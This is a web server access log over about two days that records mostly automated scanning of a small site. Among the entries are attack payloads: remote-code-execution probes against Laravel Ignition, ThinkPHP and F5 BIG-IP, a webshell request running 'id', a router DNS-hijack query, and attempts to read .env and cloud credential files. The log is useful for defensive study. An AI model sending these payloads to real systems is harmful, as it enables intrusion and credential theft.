[21/May/2022 05:29:39] "GET /robots.txt HTTP/1.0" 404 2178
Not Found: /sitemap.xml
[21/May/2022 05:29:46] "GET /sitemap.xml HTTP/1.0" 404 2181
[21/May/2022 05:43:14] "GET / HTTP/1.0" 302 0
[21/May/2022 05:43:16] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 05:46:31] "GET / HTTP/1.0" 302 0
[21/May/2022 05:46:31] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 06:22:17] "GET / HTTP/1.0" 302 0
[21/May/2022 06:22:19] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 06:31:14] "GET / HTTP/1.0" 302 0
[21/May/2022 06:31:14] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 06:34:12] "HEAD / HTTP/1.0" 302 0
[21/May/2022 07:03:59] "GET / HTTP/1.0" 302 0
[21/May/2022 07:03:59] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 07:11:16] "GET / HTTP/1.0" 302 0
[21/May/2022 07:11:18] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /actuator/gateway/routes
[21/May/2022 07:51:04] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
[21/May/2022 08:07:39] "GET / HTTP/1.0" 302 0
[21/May/2022 08:29:31] "GET / HTTP/1.0" 302 0
[21/May/2022 08:45:01] "GET / HTTP/1.0" 302 0
[21/May/2022 08:46:52] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 08:57:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[21/May/2022 08:58:33] "GET / HTTP/1.0" 302 0
[21/May/2022 10:14:38] "GET / HTTP/1.0" 302 0
[21/May/2022 10:36:49] "GET / HTTP/1.0" 302 0
[21/May/2022 12:14:32] "GET / HTTP/1.0" 302 0
[21/May/2022 12:14:32] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 12:16:18] "GET / HTTP/1.0" 302 0
[21/May/2022 13:19:23] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[21/May/2022 13:19:27] "POST /HNAP1/ HTTP/1.0" 404 2167
[21/May/2022 14:17:43] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 14:24:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[21/May/2022 14:57:30] "GET / HTTP/1.0" 302 0
[21/May/2022 15:26:42] "GET / HTTP/1.0" 302 0
[21/May/2022 15:26:42] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /config/getuser
[21/May/2022 15:34:49] "GET /config/getuser?index=0 HTTP/1.0" 404 2198
[21/May/2022 15:47:55] "GET / HTTP/1.0" 302 0
[21/May/2022 15:47:55] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 15:50:54] "GET / HTTP/1.0" 302 0
[21/May/2022 16:07:11] "GET / HTTP/1.0" 302 0
[21/May/2022 16:07:11] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 17:27:42] "GET / HTTP/1.0" 302 0
[21/May/2022 17:27:42] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /pv/spa122.cfg
[21/May/2022 17:29:21] "GET /pv/spa122.cfg HTTP/1.0" 404 2187
[21/May/2022 18:19:53] "GET / HTTP/1.0" 302 0
[21/May/2022 18:19:53] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /mgmt/tm/util/bash
[21/May/2022 18:41:42] "POST /mgmt/tm/util/bash HTTP/1.0" 404 2200
[21/May/2022 18:41:44] "GET / HTTP/1.0" 302 0
Not Found: /.env
[21/May/2022 19:30:24] "GET /.env HTTP/1.0" 404 2160
Not Found: /.aws/credentials
[21/May/2022 19:59:58] "GET /.aws/credentials HTTP/1.0" 404 2196
Not Found: /_ignition/execute-solution
[21/May/2022 20:01:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:01:59] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:00] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:01] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 20:02:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /fuN3
[21/May/2022 20:07:51] "GET /fuN3 HTTP/1.0" 404 2168
[21/May/2022 21:07:07] "GET / HTTP/1.0" 302 0
[21/May/2022 21:07:07] "GET /public/index.html HTTP/1.0" 200 2139
[21/May/2022 21:07:07] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[21/May/2022 21:27:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: ///.env
[21/May/2022 22:29:57] "GET ///.env HTTP/1.0" 404 2166
Not Found: /boaform/admin/formLogin
[21/May/2022 22:35:38] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 2250
Not Found: /admin/config.php
[21/May/2022 23:59:12] "GET /admin/config.php HTTP/1.0" 404 3928
Not Found: /mgmt/tm/util/bash
[22/May/2022 00:01:43] "POST /mgmt/tm/util/bash HTTP/1.0" 404 2200
[22/May/2022 00:01:44] "GET / HTTP/1.0" 302 0
Not Found: /Telerik.Web.UI.WebResource.axd
[22/May/2022 00:09:03] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.0" 404 2247
[22/May/2022 00:52:35] "GET / HTTP/1.0" 302 0
[22/May/2022 00:53:08] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 02:18:00] "GET / HTTP/1.0" 302 0
[22/May/2022 02:32:52] "GET / HTTP/1.0" 302 0
[22/May/2022 02:32:52] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 02:33:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[22/May/2022 03:01:24] "GET / HTTP/1.0" 302 0
[22/May/2022 03:01:25] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 03:20:31] "GET / HTTP/1.0" 302 0
[22/May/2022 03:28:39] "GET / HTTP/1.0" 302 0
Not Found: /sdk
[22/May/2022 03:29:09] "POST /sdk HTTP/1.0" 404 2158
Not Found: /CSS/Miniweb.css
[22/May/2022 03:29:09] "GET /CSS/Miniweb.css HTTP/1.0" 404 2193
Not Found: /.git/HEAD
[22/May/2022 03:29:09] "GET /.git/HEAD HTTP/1.0" 404 2175
Not Found: /scripts/WPnBr.dll
[22/May/2022 03:29:09] "POST /scripts/WPnBr.dll HTTP/1.0" 404 2200
[22/May/2022 03:29:09] "GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.0" 302 0
Not Found: /default.html
[22/May/2022 03:29:09] "GET /default.html HTTP/1.0" 404 2184
[22/May/2022 03:29:09] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /nmaplowercheck1653190149
[22/May/2022 03:29:09] "GET /nmaplowercheck1653190149 HTTP/1.0" 404 2220
[22/May/2022 03:29:09] "POST / HTTP/1.0" 302 0
Not Found: /default.asp
[22/May/2022 03:29:10] "GET /default.asp HTTP/1.0" 404 2181
[22/May/2022 03:29:10] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.0" 302 0
Not Found: /pools/default/buckets
[22/May/2022 03:29:10] "GET /pools/default/buckets HTTP/1.0" 404 2211
Not Found: /inicio.shtml
[22/May/2022 03:29:10] "GET /inicio.shtml HTTP/1.0" 404 2184
[22/May/2022 03:29:10] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1
[22/May/2022 03:29:10] "GET /HNAP1 HTTP/1.0" 404 2163
[22/May/2022 03:29:10] "GET / HTTP/1.0" 302 0
Not Found: /pools
[22/May/2022 03:29:10] "GET /pools HTTP/1.0" 404 2163
[22/May/2022 03:29:11] "GET /public/favicon.ico HTTP/1.0" 200 22382
[22/May/2022 03:29:11] "HEAD / HTTP/1.0" 302 0
[22/May/2022 03:29:12] "GET / HTTP/1.0" 302 0
Not Found: /Portal0000.htm
[22/May/2022 03:29:12] "GET /Portal0000.htm HTTP/1.0" 404 2190
Not Found: /Portal/Portal.mwsl
[22/May/2022 03:29:12] "GET /Portal/Portal.mwsl HTTP/1.0" 404 2202
Not Found: /uS2b
[22/May/2022 03:29:12] "GET /uS2b HTTP/1.0" 404 2160
[22/May/2022 03:29:13] "HEAD /public/index.html HTTP/1.0" 200 2139
Not Found: /tomcatwar.jsp
[22/May/2022 03:29:13] "GET /tomcatwar.jsp?pwd=j&cmd=id HTTP/1.0" 404 2204
Not Found: /__Additional
[22/May/2022 03:29:13] "GET /__Additional HTTP/1.0" 404 2184
Not Found: /docs/cplugError.html/
[22/May/2022 03:29:13] "GET /docs/cplugError.html/ HTTP/1.0" 404 2211
[22/May/2022 03:29:13] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /ghksjdghdfksanitycheckqwerjlhfgjksdghlid
[22/May/2022 03:29:13] "GET /ghksjdghdfksanitycheckqwerjlhfgjksdghlid HTTP/1.0" 404 2268
[22/May/2022 03:29:26] "GET / HTTP/1.0" 302 0
Not Found: /onvif/device_service
[22/May/2022 05:03:23] "POST /onvif/device_service HTTP/1.0" 404 2209
Not Found: /onvif/device_service
[22/May/2022 05:03:33] "POST /onvif/device_service HTTP/1.0" 404 2209
[22/May/2022 05:16:48] "GET / HTTP/1.0" 302 0
[22/May/2022 05:17:32] "GET / HTTP/1.0" 302 0
[22/May/2022 06:24:46] "GET / HTTP/1.0" 302 0
[22/May/2022 06:24:46] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 07:00:21] "GET / HTTP/1.0" 302 0
Not Found: /.env
[22/May/2022 08:11:23] "GET /.env HTTP/1.0" 404 2160
[22/May/2022 08:11:24] "POST / HTTP/1.0" 302 0
[22/May/2022 08:36:00] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[22/May/2022 08:36:01] "POST /HNAP1/ HTTP/1.0" 404 2167
Not Found: /.git/config
[22/May/2022 08:41:45] "GET /.git/config HTTP/1.0" 404 2181
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 09:36:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /portal/redlion
[22/May/2022 09:48:53] "GET /portal/redlion HTTP/1.0" 404 2190
Not Found: /actuator/health
[22/May/2022 09:58:01] "GET /actuator/health HTTP/1.0" 404 2193
[22/May/2022 10:10:49] "GET / HTTP/1.0" 302 0
Not Found: /hudson
[22/May/2022 10:19:37] "GET /hudson HTTP/1.0" 404 2166
Not Found: /.env
[22/May/2022 10:38:41] "GET /.env HTTP/1.0" 404 2160
[22/May/2022 10:38:41] "POST / HTTP/1.0" 302 0
[22/May/2022 10:38:42] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /solr/admin/info/system
[22/May/2022 10:45:57] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
[22/May/2022 10:54:07] "GET / HTTP/1.0" 302 0
[22/May/2022 10:54:07] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /pv/aastra.cfg
[22/May/2022 11:21:45] "GET /pv/aastra.cfg HTTP/1.0" 404 2187
Not Found: /index.php
[22/May/2022 11:32:24] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[22/May/2022 12:02:11] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[22/May/2022 12:02:14] "GET / HTTP/1.0" 302 0
[22/May/2022 12:02:21] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 12:28:00] "GET / HTTP/1.0" 302 0
[22/May/2022 12:28:00] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 12:35:14] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[22/May/2022 12:49:46] "GET / HTTP/1.0" 302 0
[22/May/2022 12:53:45] "HEAD / HTTP/1.0" 302 0
Not Found: /.env
[22/May/2022 12:55:51] "GET /.env HTTP/1.0" 404 2160
[22/May/2022 12:55:52] "POST / HTTP/1.0" 302 0
Not Found: /console/
[22/May/2022 12:56:46] "GET /console/ HTTP/1.0" 404 2172
[22/May/2022 12:57:55] "GET / HTTP/1.0" 302 0
[22/May/2022 12:57:55] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 13:06:50] "GET / HTTP/1.0" 302 0
Not Found: /Autodiscover/Autodiscover.xml
[22/May/2022 13:39:35] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
[22/May/2022 13:58:19] "HEAD / HTTP/1.0" 302 0
[22/May/2022 14:01:23] "GET / HTTP/1.0" 302 0
[22/May/2022 14:01:44] "GET / HTTP/1.0" 302 0
[22/May/2022 14:09:34] "GET / HTTP/1.0" 302 0
[22/May/2022 14:09:34] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 14:09:34] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[22/May/2022 14:09:34] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[22/May/2022 14:09:34] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[22/May/2022 14:09:34] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[22/May/2022 14:09:35] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
Not Found: /sockjs-node
[22/May/2022 14:09:37] "GET /sockjs-node HTTP/1.0" 404 2181
[22/May/2022 14:09:37] "GET /api/authentication/getUser HTTP/1.0" 200 71
[22/May/2022 14:09:38] "GET /admin/login?next=http%3A%2F%2F14.225.16.78%2Fpublic%2Findex.html%23%2F HTTP/1.0" 301 0
[22/May/2022 14:09:38] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[22/May/2022 14:09:38] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[22/May/2022 14:09:38] "GET /public/assets/layout/images/logo-light.png HTTP/1.0" 200 2725
[22/May/2022 14:09:38] "GET /public/assets/layout/images/profile-image.png HTTP/1.0" 200 18199
[22/May/2022 14:09:38] "GET /admin/login/?next=http%3A%2F%2F14.225.16.78%2Fpublic%2Findex.html%23%2F HTTP/1.0" 200 1897
[22/May/2022 14:09:38] "GET /public/static/js/main.chunk.js.map HTTP/1.0" 200 1196699
Not Found: /_ignition/execute-solution
[22/May/2022 14:20:16] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[22/May/2022 14:44:33] "GET / HTTP/1.0" 302 0
[22/May/2022 14:44:34] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /favicon.ico
[22/May/2022 14:44:36] "GET /favicon.ico HTTP/1.0" 404 2181
[22/May/2022 14:45:53] "GET / HTTP/1.0" 302 0
Not Found: /dnscfg.cgi
[22/May/2022 14:56:08] "GET /dnscfg.cgi?dnsPrimary=2.58.149.248&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1 HTTP/1.0" 404 2260
[22/May/2022 14:56:09] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[22/May/2022 14:59:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[22/May/2022 15:01:13] "GET / HTTP/1.0" 302 0
[22/May/2022 15:01:14] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /onvif/device_service
[22/May/2022 15:45:35] "POST /onvif/device_service HTTP/1.0" 404 2209
[22/May/2022 16:17:56] "GET / HTTP/1.0" 302 0
[22/May/2022 16:17:57] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 16:21:03] "GET / HTTP/1.0" 302 0
[22/May/2022 16:21:04] "GET / HTTP/1.0" 302 0
[22/May/2022 16:21:06] "GET /public/index.html HTTP/1.0" 200 2139
[22/May/2022 16:21:06] "GET / HTTP/1.0" 302 0
[22/May/2022 18:34:11] "GET / HTTP/1.0" 302 0
[22/May/2022 18:34:12] "GET /public/index.html HTTP/1.0" 200 2139
